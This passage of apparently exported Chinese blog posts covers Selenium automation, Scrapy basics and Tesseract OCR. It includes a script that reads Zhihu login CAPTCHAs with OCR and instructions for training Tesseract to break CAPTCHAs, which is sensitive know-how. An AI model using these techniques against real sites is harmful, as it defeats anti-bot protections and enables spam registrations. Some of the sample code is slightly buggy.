开始</li>\n\t<li>value是option标签的一个属性值，并不是显示在下拉框中的值</li>\n\t<li>visible_text是在option标签文本的值，是显示在下拉框的值</li>\n</ul></blockquote>\n\n<p>全部取消选择怎么办呢？很简单:</p>\n\n<pre class=\"has\">\n<code>select.deselect_all()\n</code></pre>\n\n<h2 id=\"弹窗处理\">弹窗处理</h2>\n\n<p>当你触发了某个事件之后，页面出现了弹窗提示，处理这个提示或者获取提示信息方法如下：</p>\n\n<pre class=\"has\">\n<code>alert = driver.switch_to_alert()\n</code></pre>\n\n<h2 id=\"页面切换\">页面切换</h2>\n\n<p>一个浏览器肯定会有很多窗口，所以我们肯定要有方法来实现窗口的切换。切换窗口的方法如下：</p>\n\n<pre class=\"has\">\n<code>driver.switch_to.window(\"this is window name\")\n</code></pre>\n\n<p>也可以使用 window_handles 方法来获取每个窗口的操作对象。例如：</p>\n\n<pre class=\"has\">\n<code>for handle in driver.window_handles:\n    driver.switch_to_window(handle)\n</code></pre>\n\n<h2 id=\"页面前进和后退\">页面前进和后退</h2>\n\n<p>操作页面的前进和后退功能：</p>\n\n<pre class=\"has\">\n<code>driver.forward()     #前进\ndriver.back()        # 后退\n</code></pre>\n\n<h2 id=\"cookies\">Cookies</h2>\n\n<p>获取页面每个Cookies值，用法如下</p>\n\n<pre class=\"has\">\n<code>for cookie in driver.get_cookies():\n    print \"%s -&gt; %s\" % (cookie['name'], cookie['value'])\n</code></pre>\n\n<p>删除Cookies，用法如下</p>\n\n<pre class=\"has\">\n<code># By name\ndriver.delete_cookie(\"CookieName\")\n\n# all\ndriver.delete_all_cookies()\n</code></pre>\n\n<h2 id=\"页面等待\">页面等待</h2>\n\n<p>注意：这是非常重要的一部分！！</p>\n\n<p>现在的网页越来越多采用了 Ajax 技术，这样程序便不能确定何时某个元素完全加载出来了。如果实际页面等待时间过长导致某个dom元素还没出来，但是你的代码直接使用了这个WebElement，那么就会抛出NullPointer的异常。</p>\n\n<p>为了避免这种元素定位困难而且会提高产生 ElementNotVisibleException 的概率。所以 Selenium 提供了两种等待方式，一种是隐式等待，一种是显式等待。</p>\n\n<p>隐式等待是等待特定的时间，显式等待是指定某一条件直到这个条件成立时继续执行。</p>\n\n<p>显式等待</p>\n\n<p>显式等待指定某个条件，然后设置最长等待时间。如果在这个时间还没有找到元素，那么便会抛出异常了。</p>\n\n<pre class=\"has\">\n<code>from selenium import webdriver\nfrom selenium.webdriver.common.by import By\n# WebDriverWait 库，负责循环等待\nfrom selenium.webdriver.support.ui import WebDriverWait\n# expected_conditions 类，负责条件出发\nfrom selenium.webdriver.support import expected_conditions as EC\n\ndriver = webdriver.Chrome()\ndriver.get(\"http://www.xxxxx.com/loading\")\ntry:\n    # 页面一直循环，直到 id=\"myDynamicElement\" 出现\n    element = WebDriverWait(driver, 10).until(\n        EC.presence_of_element_located((By.ID, \"myDynamicElement\"))\n    )\nfinally:\n    driver.quit()\n</code></pre>\n\n<p>如果不写参数，程序默认会 0.5s 调用一次来查看元素是否已经生成，如果本来元素就是存在的，那么会立即返回。</p>\n\n<p>下面是一些内置的等待条件，你可以直接调用这些条件，而不用自己写某些等待条件了。</p>\n\n<pre class=\"has\">\n<code>title_is\ntitle_contains\npresence_of_element_located\nvisibility_of_element_located\nvisibility_of\npresence_of_all_elements_located\ntext_to_be_present_in_element\ntext_to_be_present_in_element_value\nframe_to_be_available_and_switch_to_it\ninvisibility_of_element_located\nelement_to_be_clickable – it is Displayed and Enabled.\nstaleness_of\nelement_to_be_selected\nelement_located_to_be_selected\nelement_selection_state_to_be\nelement_located_selection_state_to_be\nalert_is_present\n</code></pre>\n\n<p>隐式等待</p>\n\n<p>隐式等待比较简单，就是简单地设置一个等待时间，单位为秒。</p>\n\n<pre class=\"has\">\n<code>from selenium import webdriver\n\ndriver = webdriver.Chrome()\ndriver.implicitly_wait(10) # seconds\ndriver.get(\"http://www.xxxxx.com/loading\")\nmyDynamicElement = driver.find_element_by_id(\"myDynamicElement\")\n</code></pre>\n\n<p>当然如果不设置，默认等待时间为0。</p>\n                                    </div>", "log_PostTime": 1584891217, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python：模拟登录、点击和执行 JavaScript 语句案例", "log_Intro": "Python：模拟登录、点击和执行 JavaScript 语句案例", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h2 id=\"案例一：网站模拟登录\">案例一：网站模拟登录</h2>\n\n<pre class=\"has\">\n<code class=\"language-python\"># douban.py\n\nfrom selenium import webdriver\nfrom selenium.webdriver.common.keys import Keys\nimport time\n\ndriver = webdriver.PhantomJS()\ndriver.get(\"http://www.douban.com\")\n\n# 输入账号密码\ndriver.find_element_by_name(\"form_email\").send_keys(\"xxxxx@xxxx.com\")\ndriver.find_element_by_name(\"form_password\").send_keys(\"xxxxxxxx\")\n\n# 模拟点击登录\ndriver.find_element_by_xpath(\"//input[@class='bn-submit']\").click()\n\n# 等待3秒\ntime.sleep(3)\n\n# 生成登陆后快照\ndriver.save_screenshot(\"douban.png\")\n\nwith open(\"douban.html\", \"w\") as file:\n    file.write(driver.page_source)\n\ndriver.quit()</code></pre>\n\n<h2 id=\"案例二：动态页面模拟点击\">案例二：动态页面模拟点击</h2>\n\n<pre class=\"has\">\n<code class=\"language-python\">#!/usr/bin/env python\n# -*- coding:utf-8 -*-\n\n# python的测试模块\nimport unittest\nfrom selenium import webdriver\nfrom bs4 import BeautifulSoup\n\n\nclass douyuSelenium(unittest.TestCase):\n    # 初始化方法\n    def setUp(self):\n        self.driver = webdriver.PhantomJS()\n\n    #具体的测试用例方法，一定要以test开头\n    def testDouyu(self):\n        self.driver.get('http://www.douyu.com/directory/all')\n        while True:\n            # 指定xml解析\n            soup = BeautifulSoup(driver.page_source, 'xml')\n            # 返回当前页面所有房间标题列表 和 观众人数列表\n            titles = soup.find_all('h3', {'class': 'ellipsis'})\n            nums = soup.find_all('span', {'class': 'dy-num fr'})\n\n            # 使用zip()函数来可以把列表合并，并创建一个元组对的列表[(1,2), (3,4)]\n            for title, num in zip(nums, titles):\n                print u\"观众人数:\" + num.get_text().strip(), u\"\\t房间标题: \" + title.get_text().strip()\n            # page_source.find()未找到内容则返回-1\n            if driver.page_source.find('shark-pager-disable-next') != -1:\n                break\n            # 模拟下一页点击\n            self.driver.find_element_by_class_name('shark-pager-next').click()\n\n    # 退出时的清理方法\n    def tearDown(self):\n        print '加载完成...'\n        self.driver.quit()\n\nif __name__ == \"__main__\":\n    unittest.main()</code></pre>\n\n<p> </p>\n\n<h2 id=\"案例三：执行-javascript-语句\">案例三：执行 JavaScript 语句</h2>\n\n<ul><li>\n\t<ol><li>隐藏百度图片</li>\n\t</ol></li>\n</ul><pre class=\"has\">\n<code class=\"language-python\">\nfrom selenium import webdriver\n\ndriver = webdriver.PhantomJS()\ndriver.get(\"https://www.baidu.com/\")\n\n# 给搜索输入框标红的javascript脚本\njs = \"var q=document.getElementById(\\\"kw\\\");q.style.border=\\\"2px solid red\\\";\"\n\n# 调用给搜索输入框标红js脚本\ndriver.execute_script(js)\n\n#查看页面快照\ndriver.save_screenshot(\"redbaidu.png\")\n\n#js隐藏元素，将获取的图片元素隐藏\nimg = driver.find_element_by_xpath(\"//*[@id='lg']/img\")\ndriver.execute_script('$(arguments[0]).fadeOut()',img)\n\n# 向下滚动到页面底部\ndriver.execute_script(\"$('.scroll_top').click(function(){$('html,body').animate({scrollTop: '0px'}, 800);});\")\n\n#查看页面快照\ndriver.save_screenshot(\"nullbaidu.png\")\n\ndriver.quit()\n</code></pre>\n\n<ul><li>\n\t<ol><li>模拟滚动条滚动到底部</li>\n\t</ol></li>\n</ul><pre class=\"has\">\n<code class=\"language-python\"># \nfrom selenium import webdriver\nimport time\n\ndriver = webdriver.PhantomJS()\ndriver.get(\"https://movie.douban.com/typerank?type_name=剧情&amp;type=11&amp;interval_id=100:90&amp;action=\")\n\n# 向下滚动10000像素\njs = \"document.body.scrollTop=10000\"\n#js=\"var q=document.documentElement.scrollTop=10000\"\ntime.sleep(3)\n\n#查看页面快照\ndriver.save_screenshot(\"douban.png\")\n\n# 执行JS语句\ndriver.execute_script(js)\ntime.sleep(10)\n\n#查看页面快照\ndriver.save_screenshot(\"newdouban.png\")\n\ndriver.quit()</code></pre>\n                                    </div>", "log_PostTime": 1584891218, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python：机器视觉与Tesseract介绍", "log_Intro": "Python：机器视觉与Tesseract介绍", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h2 id=\"机器视觉\">机器视觉</h2>\n\n<p>从 Google 的无人驾驶汽车到可以识别假钞的自动售卖机，机器视觉一直都是一个应用广 泛且具有深远的影响和雄伟的愿景的领域。</p>\n\n<p>我们将重点介绍机器视觉的一个分支：文字识别，介绍如何用一些 Python库来识别和使用在线图片中的文字。</p>\n\n<p>我们可以很轻松的阅读图片里的文字，但是机器阅读这些图片就会非常困难，利用这种人类用户可以正常读取但是大多数机器人都没法读取的图片，验证码 (CAPTCHA)就出现了。验证码读取的难易程度也大不相同，有些验证码比其他的更加难读。</p>\n\n<p>将图像翻译成文字一般被称为光学文字识别(Optical Character Recognition, OCR)。可以实现OCR的底层库并不多,目前很多库都是使用共同的几个底层 OCR 库,或者是在上面 进行定制。</p>\n\n<h2 id=\"orc库概述\">ORC库概述</h2>\n\n<p>在读取和处理图像、图像相关的机器学习以及创建图像等任务中，Python 一直都是非常出色的语言。虽然有很多库可以进行图像处理，但在这里我们只重点介绍：<a href=\"https://pypi.python.org/pypi/pytesseract\" rel=\"nofollow\">Tesseract</a></p>\n\n<h3 id=\"tesseract\">Tesseract</h3>\n\n<p>Tesseract 是一个 OCR 库,目前由 Google 赞助(Google 也是一家以 OCR 和机器学习技术闻名于世的公司)。Tesseract 是目前公认最优秀、最精确的开源 OCR 系统。 除了极高的精确度,Tesseract 也具有很高的灵活性。它可以通过训练识别出任何字体，也可以识别出任何 Unicode 字符。</p>\n\n<h2 id=\"安装tesseract\">安装Tesseract</h2>\n\n<h3 id=\"windows-系统\">Windows 系统</h3>\n\n<p>下载可执行安装文件<a href=\"https://code.google.com/p/tesseract-ocr/downloads/list\" rel=\"nofollow\">https://code.google.com/p/tesseract-ocr/downloads/list</a>安装。</p>\n\n<h3 id=\"linux-系统\">Linux 系统</h3>\n\n<p>可以通过 apt-get 安装: <code>$sudo apt-get tesseract-ocr</code></p>\n\n<h3 id=\"mac-os-x系统\">Mac OS X系统</h3>\n\n<p>用 Homebrew(<a href=\"http://brew.sh/)%E7%AD%89%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93%E5%8F%AF%E4%BB%A5%E5%BE%88%E6%96%B9%E4%BE%BF%E5%9C%B0%E5%AE%89%E8%A3%85\" rel=\"nofollow\">http://brew.sh/)等第三方库可以很方便地安装</a> <code>brew install tesseract</code></p>\n\n<p>要使用 Tesseract 的功能，比如后面的示例中训练程序识别字母，要先在系统中设置一 个新的环境变量 <code>$TESSDATA_PREFIX</code>，让 Tesseract 知道训练的数据文件存储在哪里，然后搞一份tessdata数据文件，放到Tesseract目录下。</p>\n\n<ul><li>\n\t<p>在大多数 Linux 系统和 Mac OS X 系统上,你可以这么设置: <code>$export TESSDATA_PREFIX=/usr/local/share/Tesseract</code></p>\n\t</li>\n\t<li>\n\t<p>在 Windows 系统上也类似,你可以通过下面这行命令设置环境变量: <code>#setx TESSDATA_PREFIX C:\\Program Files\\Tesseract OCR\\Tesseract</code></p>\n\t</li>\n</ul><h2 id=\"安装pytesseract\">安装pytesseract</h2>\n\n<p>Tesseract 是一个 Python 的命令行工具，不是通过 import 语句导入的库。安装之后,要用 tesseract 命令在 Python 的外面运行，但我们可以通过 pip 安装支持Python 版本的 Tesseract库：</p>\n\n<p><code>pip install pytesseract</code></p>\n                                    </div>", "log_PostTime": 1584891220, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python：尝试对知乎网验证码进行处理", "log_Intro": "Python：尝试对知乎网验证码进行处理", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>许多流行的内容管理系统即使加了验证码模块，其众所周知的注册页面也经常会遭到网络 机器人的垃圾注册。</p>\n\n<p>那么，这些网络机器人究，竟是怎么做的呢?既然我们已经，可以成功地识别出保存在电脑上 的验证码了，那么如何才能实现一个全能的网络机器人呢?</p>\n\n<p>大多数网站生成的验证码图片都具有以下属性。</p>\n\n<ul><li>它们是服务器端的程序动态生成的图片。验证码图片的 src 属性可能和普通图片不太一 样，比如 <code>&lt;img src=\"WebForm.aspx?id=8AP85CQKE9TJ\"&gt;</code>，但是可以和其他图片一样进行 下载和处理。</li>\n\t<li>图片的答案存储在服务器端的数据库里。</li>\n\t<li>很多验证码都有时间限制，如果你太长时间没解决就会失效。</li>\n\t<li>常用的处理方法就是，首先把验证码图片下载到硬盘里，清理干净，然后用 Tesseract 处理 图片，最后返回符合网站要求的识别结果。</li>\n</ul><pre class=\"has\">\n<code class=\"language-python\">#!/usr/bin/env python\n# -*- coding:utf-8 -*-\n\nimport requests\nimport time\nimport pytesseract\nfrom PIL import Image\nfrom bs4 import BeautifulSoup\n\ndef captcha(data):\n    with open('captcha.jpg','wb') as fp:\n        fp.write(data)\n    time.sleep(1)\n    image = Image.open(\"captcha.jpg\")\n    text = pytesseract.image_to_string(image)\n    print \"机器识别后的验证码为：\" + text\n    command = raw_input(\"请输入Y表示同意使用，按其他键自行重新输入：\")\n    if (command == \"Y\" or command == \"y\"):\n        return text\n    else:\n        return raw_input('输入验证码：')\n\ndef zhihuLogin(username,password):\n\n    # 构建一个保存Cookie值的session对象\n    sessiona = requests.Session()\n    headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'}\n\n    # 先获取页面信息，找到需要POST的数据（并且已记录当前页面的Cookie）\n    html = sessiona.get('https://www.zhihu.com/#signin', headers=headers).content\n\n    # 找到 name 属性值为 _xsrf 的input标签，取出value里的值\n    _xsrf = BeautifulSoup(html ,'lxml').find('input', attrs={'name':'_xsrf'}).get('value')\n\n    # 取出验证码，r后面的值是Unix时间戳,time.time()\n    captcha_url = 'https://www.zhihu.com/captcha.gif?r=%d&amp;type=login' % (time.time() * 1000)\n    response = sessiona.get(captcha_url, headers = headers)\n\n\n    data = {\n        \"_xsrf\":_xsrf,\n        \"email\":username,\n        \"password\":password,\n        \"remember_me\":True,\n        \"captcha\": captcha(response.content)\n    }\n\n    response = sessiona.post('https://www.zhihu.com/login/email', data = data, headers=headers)\n    print response.text\n\n    response = sessiona.get('https://www.zhihu.com/people/maozhaojun/activities', headers=headers)\n    print response.text\n\n\nif __name__ == \"__main__\":\n    #username = raw_input(\"username\")\n    #password = raw_input(\"password\")\n    zhihuLogin('xxxx@qq.com','ALAxxxxIME')\n</code></pre>\n\n<p>值得注意的是，有两种异常情况会导致这个程序运行失败。第一种情况是，如果 Tesseract 从验证码图片中识别的结果不是四个字符(因为训练样本中验证码的所有有效答案都必须 是四个字符)，结果不会被提交，程序失败。第二种情况是虽然识别的结果是四个字符， 被提交到了表单，但是服务器对结果不认可，程序仍然失败。</p>\n\n<p>在实际运行过程中，第一种 情况发生的可能性大约为 50%，发生时程序不会向表单提交，程序直接结束并提示验证码 识别错误。第二种异常情况发生的概率约为 20%，四个字符都对的概率约是 30%(每个字 母的识别正确率大约是 80%，如果是五个字符都识别，正确的总概率是 32.8%)。</p>\n                                    </div>", "log_PostTime": 1584891221, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python机器学习：训练Tesseract", "log_Intro": "Python机器学习：训练Tesseract", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h2 id=\"训练tesseract\">训练Tesseract</h2>\n\n<p>大多数其他的验证码都是比较简单的。例如，流行的 PHP 内容管理系统 Drupal 有一个著 名的验证码模块(<a href=\"https://www.drupal.org/project/captcha)%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%94%9F%E6%88%90%E4%B8%8D%E5%90%8C%E9%9A%BE%E5%BA%A6%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E3%80%82\" rel=\"nofollow\">https://www.drupal.org/project/captcha)，可以生成不同难度的验证码。</a></p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191030185826118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p> </p>\n\n<p>那么与其他验证码相比，究竟是什么让这个验证码更容易被人类和机器读懂呢?</p>\n\n<ul><li>字母没有相互叠加在一起，在水平方向上也没有彼此交叉。也就是说，可以在每一个字 母外面画一个方框，而不会重叠在一起。</li>\n\t<li>图片没有背景色、线条或其他对 OCR 程序产生干扰的噪点。</li>\n\t<li>虽然不能因一个图片下定论，但是这个验证码用的字体种类很少，而且用的是 sans-serif 字体(像“4”和“M”)和一种手写形式的字体(像“m”“C”和“3”)。</li>\n\t<li>白色背景色与深色字母之间的对比度很高。</li>\n</ul><p>这个验证码只做了一点点改变，就让 OCR 程序很难识别。</p>\n\n<ul><li>字母和数据都使用了，这会增加待搜索字符的数量。</li>\n\t<li>字母随机的倾斜程度会迷惑 OCR 软件，但是人类还是很容易识别的。</li>\n\t<li>那个比较陌生的手写字体很有挑战性，在“C”和“3”里面还有额外的线条。另外这 个非常小的小写“m”，计算机需要进行额外的训练才能识别。 用下面的代码运行 Tesseract 识别图片:</li>\n</ul><p><code>tesseract captchaExample.png output</code></p>\n\n<p>我们得到的结果 output.txt 是: 4N\\，，，C&lt;3</p>\n\n<h2>训练Tesseract</h2>\n\n<p>要训练 Tesseract 识别一种文字，无论是晦涩难懂的字体还是验证码，你都需要向 Tesseract 提供每个字符不同形式的样本。</p>\n\n<p>做这个枯燥的工作可能要花好几个小时的时间，你可能更想用这点儿时间找个好看的视频 或电影看看。首先要把大量的验证码样本下载到一个文件夹里。</p>\n\n<p>下载的样本数量由验证码 的复杂程度决定;我在训练集里一共放了 100 个样本(一共 500 个字符，平均每个字符 8 个样本;a~z 大小写字母加 0~9 数字，一共 62 个字符)，应该足够训练的了。</p>\n\n<p>提示:建议使用验证码的真实结果给每个样本文件命名(即4MmC3.jpg)。 这样可以帮你 一次性对大量的文件进行快速检查——你可以先把图片调成缩略图模式，然后通过文件名 对比不同的图片。这样在后面的步骤中进行训练效果的检查也会很方便。</p>\n\n<p>第二步是准确地告诉 Tesseract 一张图片中的每个字符是什么，以及每个字符的具体位置。 这里需要创建一些矩形定位文件(box file)，一个验证码图片生成一个矩形定位文件。一 个图片的矩形定位文件如下所示:</p>\n\n<pre class=\"has\">\n<code>\n      4 15 26 33 55 0\n      M 38 13 67 45 0\n      m 79 15 101 26 0\n      C 111 33 136 60 0\n      3 147 17 176 45 0\n</code></pre>\n\n<p>第一列符号是图片中的每个字符，后面的 4 个数字分别是包围这个字符的最小矩形的坐标 (图片左下角是原点 (0，0)，4 个数字分别对应每个字符的左下角 x 坐标、左下角 y 坐标、右上角 x 坐标和右上角 y 坐标)，最后一个数字“0”表示图片样本的编号。</p>\n\n<p>显然，手工创建这些图片矩形定位文件很无聊，不过有一些工具可以帮你完成。我很喜欢 在线工具 Tesseract OCR Chopper(<a href=\"http://pp19dd.com/tesseract-ocr-chopper/)%EF%BC%8C%E5%9B%A0%E4%B8%BA%E5%AE%83%E4%B8%8D%E9%9C%80%E8%A6%81\" rel=\"nofollow\">http://pp19dd.com/tesseract-ocr-chopper/)，因为它不需要</a> 安装，也没有其他依赖，只要有浏览器就可以运行，而且用法很简单:上传图片，如果要 增加新矩形就单击“add”按钮，还可以根据需要调整矩形的尺寸，最后把新生成的矩形 定位文件复制到一个新文件里就可以了。</p>\n\n<p>矩形定位文件必须保存在一个 .box 后缀的文本文件中。和图片文件一样，文本文件也是用 验证码的实际结果命名(例如，4MmC3.box)。另外，这样便于检查 .box 文件的内容和文件的名称，而且按文件名对目录中的文件排序之后，就可以让 .box 文件与对应的图片文件 的实际结果进行对比。</p>\n\n<p>你还需要创建大约 100 个 .box 文件来保证你有足够的训练数据。因为 Tesseract 会忽略那 些不能读取的文件，所以建议你尽量多做一些矩形定位文件，以保证训练足够充分。如果 你觉得训练的 OCR 结果没有达到你的目标，或者 Tesseract 识别某些字符时总是出错，多 创建一些训练数据然后重新训练将是一个不错的改进方法。</p>\n\n<p>创建完满载 .box 文件和图片文件的数据文件夹之后，在做进一步分析之前最好备份一下这 个文件夹。虽然在数据上运行训练程序不太可能删除任何数据，但是创建 .box 文件用了你 好几个小时的时间，来之不易，稳妥一点儿总没错。此外，能够抓取一个满是编译数据的 混乱目录，然后再尝试一次，总是好的。</p>\n\n<p>前面的内容只是对 Tesseract 库强大的字体训练和识别能力的一个简略概述。如果你对 Tesseract 的其他训练方法感兴趣，甚至打算建立自己的验证码训练文件库，或者想和全世 界的 Tesseract 爱好者分享自己对一种新字体的识别成果，推荐阅读 Tesseract 的文档：<a href=\"https://github.com/tesseract-ocr/tesseract/wiki\">https://github.com/tesseract-ocr/tesseract/wiki</a>，加油！</p>\n                                    </div>", "log_PostTime": 1584891223, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python:Scrapy 框架简单介绍", "log_Intro": "Python:Scrapy 框架简单介绍", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <ul><li>\n\t<p>Scrapy是用纯Python实现一个为了爬取网站数据、提取结构性数据而编写的应用框架，用途非常广泛。</p>\n\t</li>\n\t<li>\n\t<p>框架的力量，用户只需要定制开发几个模块就可以轻松的实现一个爬虫，用来抓取网页内容以及各种图片，非常之方便。</p>\n\t</li>\n\t<li>\n\t<p>Scrapy 使用了 Twisted<code>['twɪstɪd]</code>(其主要对手是Tornado)异步网络框架来处理网络通讯，可以加快我们的下载速度，不用自己去实现异步框架，并且包含了各种中间件接口，可以灵活的完成各种需求。</p>\n\t</li>\n</ul><h2 id=\"scrapy架构图绿线是数据流向：\">Scrapy架构图(绿线是数据流向)：</h2>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191101225924128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p> </p>\n\n<ul><li>\n\t<p><code>Scrapy Engine(引擎)</code>: 负责<code>Spider</code>、<code>ItemPipeline</code>、<code>Downloader</code>、<code>Scheduler</code>中间的通讯，信号、数据传递等。</p>\n\t</li>\n\t<li>\n\t<p><code>Scheduler(调度器)</code>: 它负责接受<code>引擎</code>发送过来的Request请求，并按照一定的方式进行整理排列，入队，当<code>引擎</code>需要时，交还给<code>引擎</code>。</p>\n\t</li>\n\t<li>\n\t<p><code>Downloader（下载器）</code>：负责下载<code>Scrapy Engine(引擎)</code>发送的所有Requests请求，并将其获取到的Responses交还给<code>Scrapy Engine(引擎)</code>，由<code>引擎</code>交给<code>Spider</code>来处理，</p>\n\t</li>\n\t<li>\n\t<p><code>Spider（爬虫）</code>：它负责处理所有Responses,从中分析提取数据，获取Item字段需要的数据，并将需要跟进的URL提交给<code>引擎</code>，再次进入<code>Scheduler(调度器)</code>，</p>\n\t</li>\n\t<li>\n\t<p><code>Item Pipeline(管道)</code>：它负责处理<code>Spider</code>中获取到的Item，并进行进行后期处理（详细分析、过滤、存储等）的地方.</p>\n\t</li>\n\t<li>\n\t<p><code>Downloader Middlewares（下载中间件）</code>：你可以当作是一个可以自定义扩展下载功能的组件。</p>\n\t</li>\n\t<li>\n\t<p><code>Spider Middlewares（Spider中间件）</code>：你可以理解为是一个可以自定扩展和操作<code>引擎</code>和<code>Spider</code>中间<code>通信</code>的功能组件（比如进入<code>Spider</code>的Responses;和从<code>Spider</code>出去的Requests）</p>\n\t</li>\n</ul><h2 id=\"scrapy的运作流程\">Scrapy的运作流程</h2>\n\n<p>代码写好，程序开始运行...</p>\n\n<ol><li>\n\t<p><code>引擎</code>：Hi！<code>Spider</code>, 你要处理哪一个网站？</p>\n\t</li>\n\t<li>\n\t<p><code>Spider</code>：老大要我处理xxxx.com。</p>\n\t</li>\n\t<li>\n\t<p><code>引擎</code>：你把第一个需要处理的URL给我吧。</p>\n\t</li>\n\t<li>\n\t<p><code>Spider</code>：给你，第一个URL是xxxxxxx.com。</p>\n\t</li>\n\t<li>\n\t<p><code>引擎</code>：Hi！<code>调度器</code>，我这有request请求你帮我排序入队一下。</p>\n\t</li>\n\t<li>\n\t<p><code>调度器</code>：好的，正在处理你等一下。</p>\n\t</li>\n\t<li>\n\t<p><code>引擎</code>：Hi！<code>调度器</code>，把你处理好的request请求给我。</p>\n\t</li>\n\t<li>\n\t<p><code>调度器</code>：给你，这是我处理好的request</p>\n\t</li>\n\t<li>\n\t<p><code>引擎</code>：Hi！下载器，你按照老大的<code>下载中间件</code>的设置帮我下载一下这个request请求</p>\n\t</li>\n\t<li>\n\t<p><code>下载器</code>：好的！给你，这是下载好的东西。（如果失败：sorry，这个request下载失败了。然后<code>引擎</code>告诉<code>调度器</code>，这个request下载失败了，你记录一下，我们待会儿再下载）</p>\n\t</li>\n\t<li>\n\t<p><code>引擎</code>：Hi！<code>Spider</code>，这是下载好的东西，并且已经按照老大的<code>下载中间件</code>处理过了，你自己处理一下（注意！这儿responses默认是交给<code>def parse()</code>这个函数处理的）</p>\n\t</li>\n\t<li>\n\t<p><code>Spider</code>：（处理完毕数据之后对于需要跟进的URL），Hi！<code>引擎</code>，我这里有两个结果，这个是我需要跟进的URL，还有这个是我获取到的Item数据。</p>\n\t</li>\n\t<li>\n\t<p><code>引擎</code>：Hi ！<code>管道</code> 我这儿有个item你帮我处理一下！<code>调度器</code>！这是需要跟进URL你帮我处理下。然后从第四步开始循环，直到获取完老大需要全部信息。</p>\n\t</li>\n\t<li>\n\t<p><code>管道``调度器</code>：好的，现在就做！</p>\n\t</li>\n</ol><p><strong>注意！只有当<code>调度器</code>中不存在任何request了，整个程序才会停止，（也就是说，对于下载失败的URL，Scrapy也会重新下载。）</strong></p>\n\n<h3 id=\"制作-scrapy-爬虫-一共需要4步：\">制作 Scrapy 爬虫 一共需要4步：</h3>\n\n<ul><li>新建项目 (scrapy startproject xxx)：新建一个新的爬虫项目</li>\n\t<li>明确目标 （编写items.py）：明确你想要抓取的目标</li>\n\t<li>制作爬虫 （spiders/xxspider.py）：制作爬虫开始爬取网页</li>\n\t<li>存储内容 （pipelines.py）：设计管道存储爬取内容</li>\n</ul>                                    </div>", "log_PostTime": 1584891223, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python:Scrapy的安装和入门案例", "log_Intro": "Python:Scrapy的安装和入门案例", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1 id=\"scrapy的安装介绍\">Scrapy的安装介绍</h1>\n\n<p>Scrapy框架官方网址：<a href=\"http://doc.scrapy.org/en/latest/\" rel=\"nofollow\">http://doc.scrapy.org/en/latest</a></p>\n\n<p>Scrapy中文维护站点：<a href=\"http://scrapy-chs.readthedocs.io/zh_CN/latest/index.html\" rel=\"nofollow\">http://scrapy-chs.readthedocs.io/zh_CN/latest/index.html</a></p>\n\n<h3 id=\"windows-安装方式\">Windows 安装方式</h3>\n\n<ul><li>Python 2 / 3</li>\n\t<li>升级pip版本：<code>pip install --upgrade pip</code></li>\n\t<li>通过pip 安装 Scrapy 框架<code>pip install Scrapy</code></li>\n</ul><h3 id=\"ubuntu-需要910或以上版本安装方式\">Ubuntu 需要9.10或以上版本安装方式</h3>\n\n<ul><li>Python 2 / 3</li>\n\t<li>安装非Python的依赖 <code>sudo apt-get install python-dev python-pip libxml2-dev libxslt1-dev zlib1g-dev libffi-dev libssl-dev</code></li>\n\t<li>通过pip 安装 Scrapy 框架 <code>sudo pip install scrapy</code></li>\n</ul><p>安装后，只要在命令终端输入 scrapy，提示类似以下结果，代表已经安装成功</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191102003019948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p> </p>\n\n<p>具体Scrapy安装流程参考：<a href=\"http://doc.scrapy.org/en/latest/intro/install.html#intro-install-platform-notes\" rel=\"nofollow\">http://doc.scrapy.org/en/latest/intro/install.html#intro-install-platform-notes</a> 里面有各个平台的安装方法</p>\n\n<h1 id=\"入门案例\">入门案例</h1>\n\n<h2 id=\"学习目标\">学习目标</h2>\n\n<ul><li>创建一个Scrapy项目</li>\n\t<li>定义提取的结构化数据(Item)</li>\n\t<li>编写爬取网站的 Spider 并提取出结构化数据(Item)</li>\n\t<li>编写 Item Pipelines 来存储提取到的Item(即结构化数据)</li>\n</ul><h2 id=\"一-新建项目scrapy-startproject\">一. 新建项目(scrapy startproject)</h2>\n\n<ul><li>在开始爬取之前，必须创建一个新的Scrapy项目。进入自定义的项目目录中，运行下列命令：</li>\n</ul><pre class=\"has\">\n<code>scrapy startproject mySpider\n</code></pre>\n\n<ul><li>其中， mySpider 为项目名称，可以看到将会创建一个 mySpider 文件夹，目录结构大致如下：</li>\n</ul><p><img alt=\"\" class=\"has\" 